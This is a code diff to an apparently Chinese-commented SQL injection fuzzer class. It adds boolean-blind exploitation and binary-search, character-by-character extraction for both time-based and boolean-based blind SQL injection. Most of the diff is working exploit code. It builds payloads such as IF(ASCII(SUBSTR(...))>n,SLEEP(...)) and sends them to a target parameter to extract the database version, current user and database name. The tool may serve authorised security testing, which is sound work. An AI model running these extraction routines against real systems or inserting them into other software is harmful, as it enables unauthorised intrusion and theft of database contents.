@@ -209,6 +209,23 @@ class SQLiFuzzer(BaseFuzzer):
                 )
 
         # ============================================================
+        # Step 4: 尝试布尔盲注提取数据
+        # ============================================================
+        if requests_sent < task.max_requests - 20:
+            timeline.append({"step": "boolean_blind_exploit", "action": "尝试布尔盲注提取数据"})
+            boolean_result = await self._exploit_boolean_blind(task, timeline)
+            requests_sent += boolean_result["requests"]
+
+            if boolean_result["success"]:
+                extracted_data.update(boolean_result["data"])
+                elapsed = time.time() - t0
+                return self._build_success_evidence(
+                    extracted_data, requests_sent, elapsed,
+                    boolean_result.get("poc", ""), timeline,
+                    method="布尔盲注",
+                )
+
+        # ============================================================
         # 利用失败
         # ============================================================
         elapsed = time.time() - t0
@@ -498,7 +515,7 @@ class SQLiFuzzer(BaseFuzzer):
     # ============================================================
 
     async def _exploit_time_blind(self, task: FuzzTask, timeline: list) -> dict[str, Any]:
-        """时间盲注逐字符提取数据。"""
+        """时间盲注逐字符提取数据（使用二分搜索优化）。"""
         result: dict[str, Any] = {"success": False, "requests": 0, "data": {}}
         delay = self.SLEEP_DELAY
 
@@ -507,8 +524,8 @@ class SQLiFuzzer(BaseFuzzer):
         if not working_tpl:
             return result
 
-        # 提取 version()（最多 BLIND_MAX_CHARS 字符）
-        version = await self._blind_extract_string(
+        # 使用二分搜索提取 version()（更快，请求更少）
+        version = await self._blind_extract_string_binary(
             task, working_tpl, "VERSION()", result, max_chars=30
         )
         if version:
@@ -518,7 +535,7 @@ class SQLiFuzzer(BaseFuzzer):
 
             # 继续提取 current_user
             if result["requests"] < task.max_requests - 20:
-                user = await self._blind_extract_string(
+                user = await self._blind_extract_string_binary(
                     task, working_tpl, "CURRENT_USER()", result, max_chars=30
                 )
                 if user:
@@ -526,7 +543,7 @@ class SQLiFuzzer(BaseFuzzer):
 
             # 提取 database()
             if result["requests"] < task.max_requests - 20:
-                db = await self._blind_extract_string(
+                db = await self._blind_extract_string_binary(
                     task, working_tpl, "DATABASE()", result, max_chars=30
                 )
                 if db:
@@ -534,6 +551,51 @@ class SQLiFuzzer(BaseFuzzer):
 
         timeline.append({
             "step": "time_blind_result",
+            "data_extracted": list(result["data"].keys()),
+            "total_requests": result["requests"],
+        })
+
+        return result
+
+    async def _exploit_boolean_blind(self, task: FuzzTask, timeline: list) -> dict[str, Any]:
+        """布尔盲注数据提取（使用二分搜索优化）。"""
+        result: dict[str, Any] = {"success": False, "requests": 0, "data": {}}
+
+        # 构造注入点信息
+        injection_point = {
+            "url": task.target_url,
+            "body": task.body,
+            "param_name": task.param_name,
+            "original_value": task.original_value,
+        }
+
+        # 使用二分搜索提取 version()
+        version = await self._boolean_blind_extract_string(
+            task, injection_point, "VERSION()", result, max_chars=30
+        )
+        if version:
+            result["success"] = True
+            result["data"]["db_version"] = version
+            result["poc"] = f"布尔盲注提取 VERSION(): {version}"
+
+            # 继续提取 current_user
+            if result["requests"] < task.max_requests - 20:
+                user = await self._boolean_blind_extract_string(
+                    task, injection_point, "CURRENT_USER()", result, max_chars=30
+                )
+                if user:
+                    result["data"]["current_user"] = user
+
+            # 提取 database()
+            if result["requests"] < task.max_requests - 20:
+                db = await self._boolean_blind_extract_string(
+                    task, injection_point, "DATABASE()", result, max_chars=30
+                )
+                if db:
+                    result["data"]["current_db"] = db
+
+        timeline.append({
+            "step": "boolean_blind_result",
             "data_extracted": list(result["data"].keys()),
             "total_requests": result["requests"],
         })
@@ -632,6 +694,240 @@ class SQLiFuzzer(BaseFuzzer):
                 break  # 字符串结束
 
         return extracted
+
+    async def _blind_extract_string_binary(
+        self,
+        task: FuzzTask,
+        blind_tpl: str,
+        expr: str,
+        result: dict,
+        max_chars: int = 50,
+        charset: str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-{}",
+    ) -> str:
+        """使用二分搜索提取字符串（比线性快 ~10x）
+
+        通过二分搜索 ASCII 值来定位每个字符，减少请求次数。
+        线性搜索每个字符需要 ~70 次请求（遍历 charset），
+        二分搜索每个字符仅需 ~7 次请求（log2(126-32) ≈ 7）。
+        """
+        delay = self.SLEEP_DELAY
+        threshold = delay * self.TIME_THRESHOLD
+        extracted_chars = []
+
+        # 先测基线时间
+        baseline = await self._send_request(
+            method=task.method, url=task.target_url,
+            headers=task.headers, body=task.body, timeout=task.timeout,
+        )
+        result["requests"] += 1
+        baseline_time = baseline.get("elapsed", 0)
+
+        for pos in range(1, max_chars + 1):
+            if result["requests"] >= task.max_requests:
+                break
+
+            # 二分搜索 ASCII 值：32-126（可打印字符范围）
+            low, high = 32, 126
+            found_char = None
+
+            while low <= high:
+                if result["requests"] >= task.max_requests:
+                    break
+
+                mid = (low + high) // 2
+
+                # Payload: IF(ASCII(SUBSTR(({expr}),{pos},1))>{mid},SLEEP({delay}),0)
+                payload_greater = f"' AND IF(ASCII(SUBSTR(({expr}),{pos},1))>{mid},SLEEP({delay}),0)-- -"
+                inject_url, inject_body = self._inject_param(
+                    task.target_url, task.body, task.param_name,
+                    task.original_value, payload_greater
+                )
+                t0 = time.time()
+                resp = await self._send_request(
+                    method=task.method, url=inject_url,
+                    headers=task.headers, body=inject_body,
+                    timeout=task.timeout + delay + 5,
+                )
+                result["requests"] += 1
+                elapsed_greater = time.time() - t0
+
+                if resp["error"]:
+                    low = mid + 1
+                    continue
+
+                if elapsed_greater >= baseline_time + threshold:
+                    # 字符 ASCII 值大于 mid
+                    low = mid + 1
+                else:
+                    # 测试是否等于 mid
+                    payload_equals = f"' AND IF(ASCII(SUBSTR(({expr}),{pos},1))={mid},SLEEP({delay}),0)-- -"
+                    inject_url, inject_body = self._inject_param(
+                        task.target_url, task.body, task.param_name,
+                        task.original_value, payload_equals
+                    )
+                    t0 = time.time()
+                    resp = await self._send_request(
+                        method=task.method, url=inject_url,
+                        headers=task.headers, body=inject_body,
+                        timeout=task.timeout + delay + 5,
+                    )
+                    result["requests"] += 1
+                    elapsed_equals = time.time() - t0
+
+                    if not resp["error"] and elapsed_equals >= baseline_time + threshold:
+                        found_char = chr(mid)
+                        break
+                    else:
+                        high = mid - 1
+
+            if found_char:
+                extracted_chars.append(found_char)
+                log.info(f"二分搜索提取位置 {pos}: {found_char} (ASCII {ord(found_char)})")
+            else:
+                # 字符串结束或搜索失败
+                break
+
+        return "".join(extracted_chars)
+
+    async def _boolean_blind_extract_string(
+        self,
+        task: FuzzTask,
+        injection_point: dict,
+        query: str,
+        result: dict,
+        max_chars: int = 50,
+    ) -> str:
+        """布尔盲注数据提取
+
+        通过观察 True/False 条件下响应的差异来逐字符提取数据。
+        使用二分搜索优化，减少请求次数。
+        """
+        extracted_chars = []
+
+        # 获取基线响应
+        baseline_resp = await self._send_request(
+            method=task.method, url=task.target_url,
+            headers=task.headers, body=task.body, timeout=task.timeout,
+        )
+        result["requests"] += 1
+        baseline_body = baseline_resp.get("body", "")
+
+        for pos in range(1, max_chars + 1):
+            if result["requests"] >= task.max_requests:
+                break
+
+            # 二分搜索 ASCII 值
+            low, high = 32, 126
+            found_char = None
+
+            while low <= high:
+                if result["requests"] >= task.max_requests:
+                    break
+
+                mid = (low + high) // 2
+
+                # True payload: ASCII 值 > mid
+                true_payload = f"' AND ASCII(SUBSTR(({query}),{pos},1))>{mid}-- -"
+                inject_url, inject_body = self._inject_param(
+                    task.target_url, task.body, task.param_name,
+                    task.original_value, true_payload
+                )
+                true_resp = await self._send_request(
+                    method=task.method, url=inject_url,
+                    headers=task.headers, body=inject_body,
+                    timeout=task.timeout,
+                )
+                result["requests"] += 1
+
+                # False payload: ASCII 值 <= mid
+                false_payload = f"' AND ASCII(SUBSTR(({query}),{pos},1))<={mid}-- -"
+                inject_url, inject_body = self._inject_param(
+                    task.target_url, task.body, task.param_name,
+                    task.original_value, false_payload
+                )
+                false_resp = await self._send_request(
+                    method=task.method, url=inject_url,
+                    headers=task.headers, body=inject_body,
+                    timeout=task.timeout,
+                )
+                result["requests"] += 1
+
+                if true_resp["error"] or false_resp["error"]:
+                    continue
+
+                # 判断 True/False 条件
+                true_is_different = self._is_true_response(true_resp.get("body", ""), baseline_body)
+                false_is_different = self._is_true_response(false_resp.get("body", ""), baseline_body)
+
+                if true_is_different and not false_is_different:
+                    # 字符 ASCII 值 > mid
+                    low = mid + 1
+                elif not true_is_different and false_is_different:
+                    # 字符 ASCII 值 <= mid
+                    high = mid
+                elif true_is_different and false_is_different:
+                    # 两者都不同，说明条件为等于
+                    found_char = chr(mid)
+                    break
+                else:
+                    # 两者都相同，可能已到字符串末尾
+                    high = mid - 1
+
+            if found_char:
+                extracted_chars.append(found_char)
+                log.info(f"布尔盲注提取位置 {pos}: {found_char} (ASCII {ord(found_char)})")
+            else:
+                break
+
+        return "".join(extracted_chars)
+
+    def _is_true_response(self, response_body: str, baseline_body: str) -> bool:
+        """判断响应是否为 True 条件的响应
+
+        通过比较响应长度和内容差异来判断。
+        True 条件的响应应该与基线相似或更长（因为条件成立返回了正常数据）。
+        """
+        if not response_body:
+            return False
+
+        # 归一化响应体（剥离动态内容）
+        def normalize(text: str) -> str:
+            import re as _re
+            if not text:
+                return ""
+            s = text
+            s = _re.sub(r'\b\d{10,13}\b', '', s)  # Unix 时间戳
+            s = _re.sub(r'\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2}(?:\.\d+)?Z?', '', s)  # ISO 时间
+            s = _re.sub(r'(csrf|nonce|_token|token|xsrf)["\']?\s*[:=]\s*["\']?[a-zA-Z0-9_\-]{16,}', '', s, flags=_re.IGNORECASE)
+            s = _re.sub(r'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+', '', s)  # JWT
+            s = _re.sub(r'\b[0-9a-f]{32,64}\b', '', s, flags=_re.IGNORECASE)  # MD5/SHA hash
+            s = _re.sub(r'\s+', ' ', s).strip()
+            return s
+
+        norm_response = normalize(response_body)
+        norm_baseline = normalize(baseline_body)
+
+        # 计算相似度
+        if not norm_response and not norm_baseline:
+            return True
+        if not norm_response or not norm_baseline:
+            return False
+
+        # 长度比较
+        len_ratio = len(norm_response) / max(len(norm_baseline), 1)
+        if len_ratio > 0.9:
+            return True
+        if len_ratio < 0.5:
+            return False
+
+        # Jaccard 相似度
+        tokens1 = set(norm_response.split())
+        tokens2 = set(norm_baseline.split())
+        if tokens1 and tokens2:
+            jaccard = len(tokens1 & tokens2) / len(tokens1 | tokens2)
+            return jaccard >= 0.85
+
+        return False
 
     # ============================================================
     # 辅助方法
